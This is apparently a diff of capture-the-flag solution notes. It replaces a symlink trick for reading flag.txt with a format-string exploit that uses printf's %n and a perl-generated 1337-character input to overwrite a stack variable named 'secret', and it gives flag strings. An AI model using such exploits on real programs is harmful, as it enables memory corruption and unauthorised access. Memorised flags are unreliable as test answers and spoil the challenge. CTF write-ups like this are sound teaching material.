@@ -1,2 +1,3 @@
-You just make a link named flag.cow which links to the flag.txt file and bob's your uncle
-flag: `flag_moo_moo_the_cow_says`
+Using printf's %n operator we can write a character 1337 times and get that number into the next variable on the stack, being `secret`.
+we could do this like `./fermat "$(perl -e 'print "a"x1337')%n"`
+flag: `flag_fermats_last_exploit`
